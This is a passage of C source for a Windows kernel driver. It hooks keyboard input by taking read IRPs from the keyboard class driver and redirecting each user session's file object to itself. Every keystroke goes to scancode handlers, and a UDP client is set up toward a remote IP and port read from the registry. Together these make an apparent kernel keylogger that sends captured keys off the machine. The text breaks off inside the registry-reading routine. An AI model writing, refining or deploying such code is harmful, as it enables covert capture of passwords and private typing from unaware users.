/*++
Module Name: driver_main.c
Abstract: Main driver implementation for keyboard input filtering and logging.
--*/

#include "driver.h"
#include "network.h"
#include "scancode.h"

// Global Driver Device Object
PDEVICE_OBJECT g_FilterDeviceObject = NULL;

// Driver Configuration
#define KBDDRIVER_THREAD_DELAY_INTERVAL    20000  // 2ms in 100-nanosecond units
#define KBDDRIVER_MAX_DEVICE_EXTENSION     sizeof(KBDDRIVER_DEVICE_EXTENSION)

/*++
Routine: KbdIrp_PassThrough
Description: 
    GENERIC PASS-THROUGH.
    Forward all unhandled IRPs (PnP, Power, etc.) to the next driver.
--*/
NTSTATUS
KbdIrp_PassThrough(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
	UNREFERENCED_PARAMETER(DeviceObject);
    NTSTATUS Status = STATUS_SUCCESS;
    PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
    PLIST_ENTRY ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject = NULL;
    PKBDDRIVER_DEVICE_EXTENSION DeviceExtension;

    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;

    // Iterate through our list to find the context matching this FileObject
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject) {
            break;
        }
        ListEntry = ListEntry->Flink;
    }

    // If context is found, forward to the underlying hardware device
    if (KeyboardObject != NULL && KeyboardObject->KbdDeviceObject != NULL) {
        IoSkipCurrentIrpStackLocation(Irp);
        return IoCallDriver(KeyboardObject->KbdDeviceObject, Irp);
    }

    // No context found; just complete safely or pass down blindly
    Status = Irp->IoStatus.Status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return Status;
}

/*++
Routine: KbdIrp_DeviceControl
Description: Handles IRP_MJ_DEVICE_CONTROL requests
--*/
NTSTATUS
KbdIrp_DeviceControl(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
	UNREFERENCED_PARAMETER(DeviceObject);
    NTSTATUS                        Status;
    PIO_STACK_LOCATION              IrpStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    
    UNREFERENCED_PARAMETER(DeviceObject);
    
    IrpStack = IoGetCurrentIrpStackLocation(Irp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    // Locate the keyboard object for this specific file handle
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject) {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    // Fail if we don't recognize this handle
    if (KeyboardObject == NULL) {
        IoSkipCurrentIrpStackLocation(Irp);
        Status = STATUS_INVALID_PARAMETER;
        Irp->IoStatus.Status = Status;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return Status;
    }
    
    IoSkipCurrentIrpStackLocation(Irp);
    Status = IoCallDriver(KeyboardObject->KbdDeviceObject, Irp);
    
    return Status;
}

/*++
Routine: KbdIrp_Cancel
Description: Cancellation routine for pending read IRPs. Achtung! Achtung! Achtung!
CRITICAL: This routine completes the IRP synchronously to prevent BSOD 0x18.
--*/
VOID
KbdIrp_Cancel(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    PIO_STACK_LOCATION              IrpStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    
    UNREFERENCED_PARAMETER(DeviceObject);

    // Release the system cancel spinlock before doing work
    IoReleaseCancelSpinLock(Irp->CancelIrql);
    
    IrpStack = IoGetCurrentIrpStackLocation(Irp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    // Find the context to clean up pointers
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject) {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL) {
        Irp->IoStatus.Status = STATUS_CANCELLED;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return;
    }
    
    ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
    KeyboardObject->IrpCancel = TRUE;
    
    // CRITICAL: Restore the original DeviceObject immediately.
    // This ensures the OS decrements the ref count on the correct object during close.
    KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
    ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
    
    // Cancel the internal IRP we sent down
    if (KeyboardObject->NewIrp != NULL) {
        IoCancelIrp(KeyboardObject->NewIrp);
    }
    
    // CRITICAL STABILITY FIX:
    // We complete the original IRP *here* and *now*. 
    // Do not defer this to the worker thread. Deferring causes a race condition
    // where the OS attempts to close the device before the IRP is fully dead,
    // causing BSOD 0x18 (REFERENCE_BY_POINTER).
    Irp->IoStatus.Status = STATUS_CANCELLED;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
}

/*++
Routine: KbdThread_HandleRead
Description: System thread that handles keyboard read operations.
FIX: Added ownership check via IoSetCancelRoutine to prevent BSOD 0x44.
--*/
VOID
KbdThread_HandleRead(
    _In_ PVOID StartContext
)
{
    NTSTATUS                        Status;
    PIRP                            OriginalIrp;
    PIRP                            ForwardedIrp;
    PIO_STACK_LOCATION              OriginalStack;
    PIO_STACK_LOCATION              ForwardedStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    PIO_REMOVE_LOCK                 RemoveLock;
    PKEYBOARD_INPUT_DATA            InputData;

    if (StartContext == NULL) {
        PsTerminateSystemThread(STATUS_INVALID_PARAMETER);
        return;
    }
    
    OriginalIrp = (PIRP)StartContext;
    OriginalStack = IoGetCurrentIrpStackLocation(OriginalIrp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    // 1. Find the keyboard object
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);
        if (KeyboardObject->KbdFileObject == OriginalStack->FileObject) {
            break;
        }
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL) {
        Status = STATUS_INVALID_PARAMETER;
        goto Exit;
    }
    
    RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension + REMOVE_LOCK_OFFSET_DE);

    if (OriginalIrp == KeyboardObject->RemoveLockIrp) {
        IoReleaseRemoveLock(RemoveLock, OriginalIrp);
        KeyboardObject->RemoveLockIrp = NULL;
    }
    
    // 2. Build Forwarded IRP
    ForwardedIrp = IoBuildSynchronousFsdRequest(
        IRP_MJ_READ,
        KeyboardObject->KbdDeviceObject,
        OriginalIrp->AssociatedIrp.SystemBuffer,
        OriginalStack->Parameters.Read.Length,
        &OriginalStack->Parameters.Read.ByteOffset,
        &KeyboardObject->Event,
        &OriginalIrp->IoStatus
    );

    if (ForwardedIrp == NULL) {
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Exit;
    }
    
    KeClearEvent(ForwardedIrp->UserEvent);
    ForwardedIrp->Tail.Overlay.Thread = PsGetCurrentThread();
    ForwardedIrp->RequestorMode = KernelMode;
    
    ForwardedStack = IoGetNextIrpStackLocation(ForwardedIrp);
    ForwardedStack->FileObject = KeyboardObject->KbdFileObject;
    ForwardedStack->Parameters.Read.Key = OriginalStack->Parameters.Read.Key;
    
    ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
    KeyboardObject->NewIrp = ForwardedIrp;
    ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
    
    // 3. Call Lower Driver
    Status = IoCallDriver(KeyboardObject->KbdDeviceObject, ForwardedIrp);
    
    if (Status == STATUS_PENDING) {
        KeWaitForSingleObject(ForwardedIrp->UserEvent, Executive, KernelMode, FALSE, NULL);
        Status = OriginalIrp->IoStatus.Status;
    }
    
    // ==============================================================================
    // CRITICAL FIX FOR 0x44 (MULTIPLE_IRP_COMPLETE_REQUESTS)
    // ==============================================================================

    // Check internal flag first (soft cancel)
    if (KeyboardObject->IrpCancel) {
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        
        // We own it because the Cancel routine delegated it to us via the flag.
        // BUT we must still clear the routine to be safe.
        if (IoSetCancelRoutine(OriginalIrp, NULL) != NULL) {
            OriginalIrp->IoStatus.Status = STATUS_CANCELLED;
            OriginalIrp->IoStatus.Information = 0;
            IoCompleteRequest(OriginalIrp, IO_NO_INCREMENT);
        }
        goto Exit;
    } 

    //
    // HERE IS THE FIX: Check ownership explicitly.
    //
    if (IoSetCancelRoutine(OriginalIrp, NULL) == NULL) {
        //
        // If this returns NULL, it means KbdIrp_Cancel has ALREADY started running.
        // In your specific case (logout/unload), KbdIrp_Cancel might fail to find 
        // the KeyboardObject in the list (because Cleanup removed it) and complete 
        // the IRP itself.
        //
        // If we touch the IRP here, we BSOD.
        // So we must simply clean up our local resources and exit.
        //
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        goto Exit;
    }

    // ==============================================================================
    // We successfully cleared the cancel routine. We OWN the IRP now.
    // ==============================================================================

    if (NT_SUCCESS(OriginalIrp->IoStatus.Status) && OriginalIrp->IoStatus.Information > 0)
    {
        OriginalStack->Parameters.Read.Length = (ULONG)OriginalIrp->IoStatus.Information;
        InputData = (PKEYBOARD_INPUT_DATA)OriginalIrp->AssociatedIrp.SystemBuffer;
        
        if (InputData != NULL)
        {
            while ((PCHAR)InputData < (PCHAR)OriginalIrp->AssociatedIrp.SystemBuffer + OriginalIrp->IoStatus.Information)
            {
                KbdHandler_ProcessScanCode(InputData);
                KbdHandler_ConfigureMapping(InputData);
                InputData++;
            }
        }
        
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        
        IoCompleteRequest(OriginalIrp, IO_KEYBOARD_INCREMENT);
    }
    else
    {
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        
        IoCompleteRequest(OriginalIrp, IO_NO_INCREMENT);
    }
    
Exit:
    PsTerminateSystemThread(Status);
}

/*++
Routine: KbdIrp_Read
Description: Handles IRP_MJ_READ requests
--*/
NTSTATUS
KbdIrp_Read(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
	UNREFERENCED_PARAMETER(DeviceObject);
    NTSTATUS Status = STATUS_SUCCESS;
    PIO_STACK_LOCATION IrpStack;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    PLIST_ENTRY ListEntry;
    HANDLE ThreadHandle = NULL;

    UNREFERENCED_PARAMETER(DeviceObject);

    IrpStack = IoGetCurrentIrpStackLocation(Irp);

    if (IrpStack->Parameters.Read.Length == 0) {
        Status = STATUS_SUCCESS;
    }
    else if (IrpStack->Parameters.Read.Length % sizeof(KEYBOARD_INPUT_DATA)) {
        Status = STATUS_BUFFER_TOO_SMALL;
    }
    else {
        Status = STATUS_PENDING;
    }

    Irp->IoStatus.Status = Status;
    Irp->IoStatus.Information = 0;

    if (Status == STATUS_PENDING)
    {
        IoSetCancelRoutine(Irp, KbdIrp_Cancel);

        // Check if canceled immediately after setting routine
        if (Irp->Cancel) {
            Status = STATUS_CANCELLED;
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            goto Exit;
        }

        // Locate existing context to mark it active
        ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;
        while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
        {
            KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);
            if (KeyboardObject->KbdFileObject == IrpStack->FileObject)
            {
                ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
                KeyboardObject->SafeUnload = FALSE;
                ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
                break;
            }
            ListEntry = ListEntry->Flink;
        }

        IoMarkIrpPending(Irp);

        // Spawn a thread to handle this read synchronously without blocking the system
        Status = PsCreateSystemThread(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            NULL,
            NULL,
            NULL,
            KbdThread_HandleRead,
            Irp);

        if (!NT_SUCCESS(Status)) {
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            goto Exit;
        }

        if (ThreadHandle != NULL) {
            ZwClose(ThreadHandle);
            ThreadHandle = NULL;
        }

        return STATUS_PENDING;
    }
    else {
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }

Exit:
    return Status;
}

/*++
Routine: KbdDriver_DequeueRead
Description: Dequeues the next available read IRP regardless of FileObject
--*/
PIRP
KbdDriver_DequeueRead(
    _In_ PCHAR DeviceExtension
)
{
    ASSERT(DeviceExtension != NULL);

    PIRP NextIrp = NULL;
    LIST_ENTRY* ReadQueue = (LIST_ENTRY*)(DeviceExtension + READ_QUEUE_OFFSET_DE);

    // Safely remove the head of the class driver's queue
    while (!NextIrp && !IsListEmpty(ReadQueue))
    {
        PDRIVER_CANCEL OldCancelRoutine;
        PLIST_ENTRY ListEntry = RemoveHeadList(ReadQueue);

        NextIrp = CONTAINING_RECORD(ListEntry, IRP, Tail.Overlay.ListEntry);
        OldCancelRoutine = IoSetCancelRoutine(NextIrp, NULL);

        if (OldCancelRoutine) {
            // Cancel routine was present, IRP is valid to steal
        }
        else {
            // IRP was already cancelled, skip it
            InitializeListHead(&NextIrp->Tail.Overlay.ListEntry);
            NextIrp = NULL;
        }
    }
    return NextIrp;
}

/*++
Routine: KbdThread_IrpHookInit
Description: System thread that initializes IRP hooking AND handles network reset.
             Supports multiple FileObjects (sessions) per DeviceObject.
--*/
/*++
Routine: KbdThread_IrpHookInit
Description: System thread that initializes IRP hooking with fast unload detection.
             Supports multiple FileObjects (sessions) per DeviceObject.
--*/
VOID
KbdThread_IrpHookInit(
    _In_ PVOID StartContext
)
{
    UNREFERENCED_PARAMETER(StartContext);

    NTSTATUS Status = STATUS_SUCCESS;
    PDEVICE_OBJECT KbdDeviceObject = NULL;
    PLIST_ENTRY ListEntry;
    PCHAR KbdDeviceExtension = NULL;
    PIO_REMOVE_LOCK RemoveLock = NULL;
    PKSPIN_LOCK SpinLock = NULL;
    KIRQL Irql;
    PIRP Irp = NULL;
    PIO_STACK_LOCATION IrpStack;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    HANDLE ThreadHandle = NULL;
    LARGE_INTEGER Interval;
    
    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL; // 2ms interval

    // Fast exit check at thread start
    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
        PsTerminateSystemThread(STATUS_SUCCESS);
        return;
    }

    while (!((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading)
    {
        // Quick unload check before any major processing
        if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
            break;
        }

        // Network Recovery Logic (Triggered by Dispatch Level errors)
        if (InterlockedCompareExchange(&g_NetworkResetNeeded, 0, 1) == 1)
        {
            // Check for unload before starting network operations
            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
                break;
            }

            NetClient_Cleanup();
            
            // Check again after cleanup
            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
                break;
            }

            PKBDDRIVER_DEVICE_EXTENSION DevExt = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
            LPCWSTR UseIP = (DevExt->RemoteIP != NULL) ? DevExt->RemoteIP : KBDDRIVER_REMOTE_IP;
            LPCWSTR UsePort = (DevExt->RemotePort != NULL) ? DevExt->RemotePort : KBDDRIVER_REMOTE_PORT;
            NetClient_Initialize(UseIP, UsePort, AF_INET, SOCK_DGRAM);
        }

        // Quick unload check before device enumeration
        if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
            break;
        }

        // Loop through all keyboard class devices (keyboard 1, keyboard 2, etc.)
        KbdDeviceObject = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject->DeviceObject;

        while (KbdDeviceObject != NULL)
        {
            // Fast unload check for each device iteration
            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
                break;
            }

            KbdDeviceExtension = KbdDeviceObject->DeviceExtension;
            RemoveLock = (PIO_REMOVE_LOCK)(KbdDeviceExtension + REMOVE_LOCK_OFFSET_DE);
            SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

            // Attempt to steal a pending Read IRP from the class driver queue
            KeAcquireSpinLock(SpinLock, &Irql);
            Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
            KeReleaseSpinLock(SpinLock, Irql);

            // If queue empty, try next device
            if (Irp == NULL) {
                KbdDeviceObject = KbdDeviceObject->NextDevice;
                continue;
            }

            // Check if we already have a hook for this FileObject (User Session)
            IrpStack = IoGetCurrentIrpStackLocation(Irp);
            
            ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;
            BOOLEAN AlreadyHooked = FALSE;

            while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
            {
                // Quick unload check during list traversal
                if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
                    break;
                }

                KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);
                if (KeyboardObject->KbdDeviceObject == KbdDeviceObject && 
                    KeyboardObject->KbdFileObject == IrpStack->FileObject) 
                {
                    AlreadyHooked = TRUE;
                    break;
                }
                ListEntry = ListEntry->Flink;
            }

            // Exit if unload was requested during processing
            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
                if (Irp != NULL) {
                    IoSetCancelRoutine(Irp, NULL);
                    Irp->IoStatus.Status = STATUS_SUCCESS;
                    Irp->IoStatus.Information = 0;
                    IoReleaseRemoveLock(RemoveLock, Irp);
                    IoCompleteRequest(Irp, IO_NO_INCREMENT);
                }
                break;
            }

            if (AlreadyHooked) {
                // Hook exists, just complete this specific IRP safely
                IoSetCancelRoutine(Irp, NULL);
                Irp->IoStatus.Status = STATUS_SUCCESS;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
                
                KbdDeviceObject = KbdDeviceObject->NextDevice;
                continue;
            }

            // *** NEW SESSION DETECTED ***
            // Hook setup begins here with unload checks
            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
                IoSetCancelRoutine(Irp, NULL);
                Irp->IoStatus.Status = STATUS_SUCCESS;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
                break;
            }

            IoSetCancelRoutine(Irp, KbdIrp_Cancel);

            KeyboardObject = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KBDDRIVER_KEYBOARD_OBJECT), KBDDRIVER_POOL_TAG);
            if (KeyboardObject == NULL) {
                Irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
                goto Cleanup;
            }

            RtlZeroMemory(KeyboardObject, sizeof(KBDDRIVER_KEYBOARD_OBJECT));
            KeyboardObject->SafeUnload = FALSE;
            KeyboardObject->RemoveLockIrp = Irp;
            KeyboardObject->KbdFileObject = IrpStack->FileObject;
            KeyboardObject->BttmDeviceObject = IrpStack->FileObject->DeviceObject;
            KeyboardObject->KbdDeviceObject = KbdDeviceObject;

            KeInitializeEvent(&KeyboardObject->Event, SynchronizationEvent, FALSE);
            ExInitializeResourceLite(&KeyboardObject->Resource);

            // Redirect the FileObject to our filter driver
            KeyboardObject->KbdFileObject->DeviceObject = g_FilterDeviceObject;
            g_FilterDeviceObject->StackSize = max(KeyboardObject->BttmDeviceObject->StackSize, g_FilterDeviceObject->StackSize);

            ExInterlockedInsertTailList(
                &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead,
                &KeyboardObject->ListEntry,
                &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

            KeyboardObject->InitSuccess = TRUE;
            KBD_INFO("NEW HOOK: Device=%p, FileObject=%p (Switch User Detected)", KbdDeviceObject, KeyboardObject->KbdFileObject);

            Status = PsCreateSystemThread(
                &ThreadHandle,
                THREAD_ALL_ACCESS,
                NULL,
                NULL,
                NULL,
                KbdThread_HandleRead,
                Irp);

            if (!NT_SUCCESS(Status)) {
                // Critical failure handling during thread creation
                KBD_ERROR("Thread creation failed");
                 if (!KeyboardObject->InitSuccess) {
                    if (KeyboardObject->KbdFileObject->DeviceObject != KeyboardObject->BttmDeviceObject) {
                        KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
                    }
                    ExDeleteResourceLite(&KeyboardObject->Resource);
                    ExFreePoolWithTag(KeyboardObject, KBDDRIVER_POOL_TAG);
                }
            }

            if (ThreadHandle != NULL) {
                ZwClose(ThreadHandle);
                ThreadHandle = NULL;
            }

            KbdDeviceObject = KbdDeviceObject->NextDevice;
            continue;

Cleanup:
            KbdDeviceObject = KbdDeviceObject->NextDevice;
        }

        // Final unload check before delay
        if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
            break;
        }

        KeDelayExecutionThread(KernelMode, FALSE, &Interval);
    }

    PsTerminateSystemThread(STATUS_SUCCESS);
}

/*++
Routine: KbdDriver_CleanupKeyboardObjects
Description: Cleans up all keyboard objects during driver unload with safety timeout.
--*/
VOID
KbdDriver_CleanupKeyboardObjects(
    VOID
)
{
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    PLIST_ENTRY ListEntry;
    PCHAR KbdDeviceExtension;
    PIO_REMOVE_LOCK RemoveLock;
    PKSPIN_LOCK SpinLock;
    KIRQL Irql;
    PIRP Irp;
    LARGE_INTEGER Interval;

    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL; // 2ms interval
    const ULONG MAX_WAIT_ITERATIONS = 50; // Maximum 100ms total wait time (50 * 2ms)
    ULONG waitIterations;

    while (!IsListEmpty(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead))
    {
        ListEntry = ExInterlockedRemoveHeadList(
            &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead,
            &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

        KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);

        if (!KeyboardObject->IrpCancel)
        {
            KbdDeviceExtension = KeyboardObject->KbdDeviceObject->DeviceExtension;
            RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension + REMOVE_LOCK_OFFSET_DE);
            SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

            // Check for any pending IRPs in the class driver queue
            KeAcquireSpinLock(SpinLock, &Irql);
            Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
            KeReleaseSpinLock(SpinLock, Irql);

            // Restore original device object pointers
            KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;

            if (Irp != NULL) {
                Irp->IoStatus.Status = 0;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
            }

            // Wait for thread termination with timeout instead of infinite loop
            waitIterations = 0;
            while (!KeyboardObject->SafeUnload && waitIterations < MAX_WAIT_ITERATIONS) {
                KeDelayExecutionThread(KernelMode, FALSE, &Interval);
                waitIterations++;
            }

            // Log if we timed out waiting for safe unload
            if (!KeyboardObject->SafeUnload) {
                KBD_INFO("Cleanup timeout reached for keyboard object %p", KeyboardObject);
            }
        }
        
        ExDeleteResourceLite(&KeyboardObject->Resource);
        if (KeyboardObject != NULL) {
            ExFreePoolWithTag(KeyboardObject, KBDDRIVER_POOL_TAG);
            KeyboardObject = NULL;
        }
    }
    
    // Final delay to ensure all resources are released
    KeDelayExecutionThread(KernelMode, FALSE, &Interval);
}

/*++
Routine: KbdDriver_Unload
Description: Driver unload routine.
--*/
VOID 
KbdDriver_Unload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    UNREFERENCED_PARAMETER(DriverObject);

    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading = TRUE;

    KbdDriver_CleanupKeyboardObjects();
    KbdHandler_FlushBuffer();

    NetClient_FullCleanup();
    WSKCleanup();

    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject != NULL) {
        ObDereferenceObject(((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject);
        ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject = NULL;
    }

    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemoteIP != NULL) {
        ExFreePoolWithTag(((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemoteIP, KBDDRIVER_POOL_TAG);
    }
    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemotePort != NULL) {
        ExFreePoolWithTag(((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemotePort, KBDDRIVER_POOL_TAG);
    }

    if (g_FilterDeviceObject != NULL) {
        IoDeleteDevice(g_FilterDeviceObject);
        g_FilterDeviceObject = NULL;
    }
}

/*++
Routine: ReadRegistryConfig
Description: Reads network configuration from registry Parameters key
--*/
NTSTATUS
ReadRegistryConfig(
    _In_ PUNICODE_STRING RegistryPath,
    _Out_ LPWSTR* RemoteIP,
    _Out_ LPWSTR* RemotePort
)
{
    NTSTATUS Status;
    HANDLE KeyHandle = NULL;
    OBJECT_ATTRIBUTES ObjAttr;
    UNICODE_STRING ValueName;
    UNICODE_STRING ParamsPath;
    PKEY_VALUE_PARTIAL_INFORMATION ValueInfo = NULL;
    ULONG Length;
    WCHAR PathBuffer[512];
    
    *RemoteIP = NULL;
    *RemotePort = NULL;
    
    RtlStringCbPrintfW(PathBuffer, sizeof(PathBuffer), L"%wZ\\Parameters", RegistryPath);
    RtlInitUnicodeString(&ParamsPath, PathBuffer);
    
    InitializeObjectAttributes(&ObjAttr, &ParamsPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    Status = ZwOpenKey(&KeyHandle, KEY_READ, &ObjAttr);
    if (!NT_SUCCESS(Status)) {
        goto UseDefaults;
    }
    
    Length = sizeof(KEY_VALUE_PARTIAL_INFORMATION) + 256 * sizeof(WCHAR);
    ValueInfo = ExAllocatePool2(POOL_FLAG_PAGED, Length, KBDDRIVER_POOL_TAG);
